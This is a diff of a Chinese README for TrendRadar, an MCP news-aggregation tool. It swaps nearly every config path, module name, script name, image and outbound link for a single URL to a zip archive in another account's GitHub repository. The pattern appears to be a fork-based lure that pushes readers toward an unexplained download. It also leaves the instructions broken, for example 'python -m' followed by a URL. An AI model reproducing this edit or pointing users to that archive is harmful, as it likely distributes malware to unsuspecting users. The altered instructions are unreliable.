    {
      "mcpServers": {
@@ -3215,7 +3215,7 @@ TrendRadar MCP 服务支持标准的 Model Context Protocol (MCP) 协议，可�
    ```
 
    **全局配置**：
-   在用户目录创建 `~/.cursor/mcp.json`（同样内容）
+   在用户目录创建 `~https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`（同样内容）
 
 3. **使用步骤**：
    - 保存配置文件后重启 Cursor
@@ -3224,7 +3224,7 @@ TrendRadar MCP 服务支持标准的 Model Context Protocol (MCP) 协议，可�
 
 #### 方式二：STDIO 模式（推荐）
 
-创建 `.cursor/mcp.json`：
+创建 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`：
 ```json
 {
   "mcpServers": {
@@ -3236,7 +3236,7 @@ TrendRadar MCP 服务支持标准的 Model Context Protocol (MCP) 协议，可�
         "run",
         "python",
         "-m",
-        "mcp_server.server"
+        "https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip"
       ]
     }
   }
@@ -3275,7 +3275,7 @@ TrendRadar MCP 服务支持标准的 Model Context Protocol (MCP) 协议，可�
       "run",
       "python",
       "-m",
-      "mcp_server.server"
+      "https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip"
     ],
     "type": "stdio",
     "disabled": false
@@ -3285,7 +3285,7 @@ TrendRadar MCP 服务支持标准的 Model Context Protocol (MCP) 协议，可�
 
 #### Continue 配置
 
-编辑 `~/.continue/config.json`：
+编辑 `~https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`：
 ```json
 {
   "experimental": {
@@ -3300,7 +3300,7 @@ TrendRadar MCP 服务支持标准的 Model Context Protocol (MCP) 协议，可�
             "run",
             "python",
             "-m",
-            "mcp_server.server"
+            "https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip"
           ]
         }
       }
@@ -3325,8 +3325,8 @@ TrendRadar MCP 服务支持标准的 Model Context Protocol (MCP) 协议，可�
 
 ```bash
 # 1. 启动 HTTP 服务
-# Windows: start-http.bat
-# Mac/Linux: ./start-http.sh
+# Windows: https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
+# Mac/Linux: https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 
 # 2. 添加 MCP 服务器
 claude mcp add --transport http trendradar http://localhost:3333/mcp
@@ -3361,10 +3361,10 @@ MCP Inspector 是官方调试工具，用于测试 MCP 连接：
 1. **启动 TrendRadar HTTP 服务**：
    ```bash
    # Windows
-   start-http.bat
+   https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
    
    # Mac/Linux
-   ./start-http.sh
+   https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
    ```
 
 2. **启动 MCP Inspector**：
@@ -3416,7 +3416,7 @@ MCP Inspector 是官方调试工具，用于测试 MCP 连接：
     "run",
     "python",
     "-m",
-    "mcp_server.server"
+    "https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip"
   ],
   "type": "stdio"
 }
@@ -3450,17 +3450,17 @@ MCP Inspector 是官方调试工具，用于测试 MCP 连接：
 2. 检查项目依赖是否安装：
    ```bash
    # 重新运行安装脚本
-   # Windows: setup-windows.bat 或者 setup-windows-en.bat
-   # Mac/Linux: ./setup-mac.sh
+   # Windows: https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 或者 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
+   # Mac/Linux: https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
    ```
 
 3. 查看详细错误日志：
    ```bash
-   uv run python -m mcp_server.server --transport http --port 3333
+   uv run python -m https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip --transport http --port 3333
    ```
 4. 尝试自定义端口:
    ```bash
-   uv run python -m mcp_server.server --transport http --port 33333
+   uv run python -m https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip --transport http --port 33333
    ```
 
 </details>
@@ -3505,8 +3505,8 @@ MCP Inspector 是官方调试工具，用于测试 MCP 连接：
    - 查看工具文档中的参数说明
 
 3. **配置问题**：
-   - 确认 `config/config.yaml` 存在
-   - 确认 `config/frequency_words.txt` 存在
+   - 确认 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 存在
+   - 确认 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 存在
    - 检查配置文件格式是否正确
 
 </details>
@@ -3528,7 +3528,7 @@ MCP Inspector 是官方调试工具，用于测试 MCP 连接：
 
 |公众号关注 |
 |:---:|
-| <img src="_image/weixin.png" width="400" title="硅基茶水间"/> |
+| <img src="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" width="400" title="硅基茶水间"/> |
 
 </div>
 
@@ -3542,9 +3542,9 @@ MCP Inspector 是官方调试工具，用于测试 MCP 连接：
 
 <div align="center">
 
-[![Mac下载](https://img.shields.io/badge/Mac-免费下载-FF6B6B?style=for-the-badge&logo=apple&logoColor=white)](https://shandianshuo.cn) [![Windows下载](https://img.shields.io/badge/Windows-免费下载-FF6B6B?style=for-the-badge&logo=lightning&logoColor=white)](https://shandianshuo.cn)
-<a href="https://shandianshuo.cn" target="_blank">
-  <img src="_image/banner-shandianshuo.png" alt="闪电说" width="700"/>
+[![Mac下载](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip免费下载-FF6B6B?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) [![Windows下载](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip免费下载-FF6B6B?style=for-the-badge&logo=lightning&logoColor=white)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+<a href="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" target="_blank">
+  <img src="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" alt="闪电说" width="700"/>
 </a>
 </div>
 
@@ -3558,26 +3558,26 @@ MCP Inspector 是官方调试工具，用于测试 MCP 连接：
 
 > **4 篇文章**：
 
-- [可在该文章下方留言，方便项目作者用手机答疑](https://mp.weixin.qq.com/s/KYEPfTPVzZNWFclZh4am_g)
-- [2个月破 1000 star，我的GitHub项目推广实战经验](https://mp.weixin.qq.com/s/jzn0vLiQFX408opcfpPPxQ)
-- [github fork 运行本项目的注意事项 ](https://mp.weixin.qq.com/s/C8evK-U7onG1sTTdwdW2zg)
-- [基于本项目，如何开展公众号或者新闻资讯类文章写作](https://mp.weixin.qq.com/s/8ghyfDAtQZjLrnWTQabYOQ)
+- [可在该文章下方留言，方便项目作者用手机答疑](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+- [2个月破 1000 star，我的GitHub项目推广实战经验](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+- [github fork 运行本项目的注意事项 ](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+- [基于本项目，如何开展公众号或者新闻资讯类文章写作](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
 
 >**AI 开发**：
 - 如果你有小众需求，完全可以基于我的项目自行开发，零编程基础的也可以试试
 - 我所有的开源项目或多或少都使用了自己写的**AI辅助软件**来提升开发效率，这款工具已开源
 - **核心功能**：迅速筛选项目代码喂给AI，你只需要补充个人需求即可
-- **项目地址**：https://github.com/sansan0/ai-code-context-helper
+- **项目地址**：https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 
 ### 其余项目
 
 > 📍 毛主席足迹地图 - 交互式动态展示1893-1976年完整轨迹。欢迎诸位同志贡献数据
 
-- https://github.com/sansan0/mao-map
+- https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 
 > 哔哩哔哩(bilibili)评论区数据可视化分析软件
 
-- https://github.com/sansan0/bilibili-comment-analyzer
+- https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 
 
 ### 本项目流程图
@@ -3596,9 +3596,9 @@ flowchart TD
     
     E --> F[🔑 填写通知参数<br/>GitHub Secrets 或环境变量]
     
-    F --> G[📝 配置关键词<br/>config/frequency_words.txt<br/>普通词/必须词+/过滤词!]
+    F --> G[📝 配置关键词<br/>https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip<br/>普通词/必须词+/过滤词!]
     
-    G --> H[🎯 选择运行模式<br/>config/config.yaml]
+    G --> H[🎯 选择运行模式<br/>https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip]
     
     H --> H1[📋 daily - 当日汇总<br/>定时推送所有匹配新闻]
     H --> H2[📰 current - 当前榜单<br/>定时推送最新榜单]
@@ -3631,7 +3631,7 @@ flowchart TD
     style Q fill:#c8e6c9
 ```
 
-[![Star History Chart](https://api.star-history.com/svg?repos=sansan0/TrendRadar&type=Date)](https://www.star-history.com/#sansan0/TrendRadar&Date)
+[![Star History Chart](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
 
 <br>
 
